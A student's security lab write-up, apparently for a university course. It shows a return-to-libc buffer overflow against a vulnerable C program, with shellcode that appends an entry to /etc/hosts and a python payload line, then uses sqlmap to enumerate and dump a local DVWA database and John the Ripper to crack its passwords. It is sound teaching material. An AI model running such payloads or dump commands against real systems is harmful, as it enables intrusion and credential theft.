# Lab #1, 20110431, Tang Tam Nhu, INSE3308E_03FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

and a shellcode in asm. This shellcode add a new entry in hosts file

```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux.
  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  **Answer 1**: Must conform to below structure:

Description text (optional)
- Stack frame of `vuln.c`:
  
![stackframe](https://github.com/user-attachments/assets/6ba7454b-8817-4dd2-83ab-c08021280a03)

- Compile asm program and C program to executable code.
  
![img0](https://github.com/user-attachments/assets/9fb357a1-a96b-4222-a489-8c23dcb38f00)

- Use an older bash and turn off randomly given stack value.

![img1](https://github.com/user-attachments/assets/e0baee2c-9e03-48e1-a838-cf14988c5286)

- Create environmet variable `preload` with `export`
  
![img2](https://github.com/user-attachments/assets/5eba5ab4-e8e3-4348-b619-e1961e175895)

- We need to find the address of `system`, `exit` and `preload` variable. Load `vuln.out` into `gdb` and find them.
  - Address value of system: `0xf7e50db0` will be inserted with format `\xb0\x0d\xe5\xf7`
  - Address value of exit: `0xf7e449e0` will be inserted with format `\xe0\x49\xe4\f7`
  - Address value of the string of `preload`: 0xffffde32 will be inserted with format `\x32\xde\xff\xff`
 
![img3](https://github.com/user-attachments/assets/cfe172ed-b234-4c03-8190-4f101d198441)

- Look at stack frame, we have to insert 20 bytes of padding, the next 4 bytes are the system address, the next 4 bytes are exit and the last 4 bytes are preload. So our command is:
```
r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x32\xde\xff\xff')")
```
![frame-system](https://github.com/user-attachments/assets/200582bf-198b-48b6-8522-e91b596af9ac)
![img4](https://github.com/user-attachments/assets/7eda45ff-b92b-43a1-8199-a9f8d24dd397)


output screenshot (optional)

- Before
  
![img5](https://github.com/user-attachments/assets/dc9d261e-99df-48b1-81f1-448eba44af4f)

- After

![win](https://github.com/user-attachments/assets/529baffe-f153-42df-831c-afeba8a4e703)


**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection, return-to-lib-c.

# Task 2: Attack on the database of Vulnerable App from SQLi lab

- Start docker container from SQLi.
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
- Use them command below to get information about all available databases
```
run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kdmmsrmp3voj7k0alb3e9bfgb6; security=low" --dbs
```
- The back-end database is: `MySQL`, it has two database is
  - dvwa
  - infomation_schema
  
![sql1](https://github.com/user-attachments/assets/c1ec353e-32ea-46e5-be69-ed3ec890d90c)

- In database `dvwa`
  
![sql2](https://github.com/user-attachments/assets/471338dd-0a6d-4d56-b90b-30083f5f954d)


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
- Use the command below to get users information and crack the password.
```
python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kdmmsrmp3voj7k0alb3e9bfgb6; security=low" --dump
```
![sql3](https://github.com/user-attachments/assets/cd3646a5-b1d0-45a6-b747-251d5c08b781)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

![sql4](https://github.com/user-attachments/assets/35c2cee2-bd31-41b3-8a79-adb25828302f)
